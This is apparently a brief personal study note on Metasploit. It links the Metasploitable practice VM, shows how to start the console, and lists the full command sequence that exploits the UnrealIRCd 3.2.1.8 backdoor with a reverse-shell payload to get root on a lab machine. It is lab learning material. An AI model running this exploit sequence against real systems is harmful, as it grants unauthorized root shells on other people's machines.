---
title: metasploit
date: 2019-02-27 14:25:12
tags:
---

# Metasploit

* 测试用的被攻击Linux虚拟机镜像下载

[Metasploitable](https://sourceforge.net/projects/metasploitable/)

* start msconsole

```console
service postgresql start
msconsole
```

* IRC on Metasploitable

```console
search Unreal 3.2.1.8
use exploit/unix/irc/unreal_ircd_3281_backdoor
show options
set RHOSTS 192.168.56.101
show payloads
set payload cmd/unix/reverse
show options
set LHOST 192.168.56.102
run
```

Can connect to 101 with root account
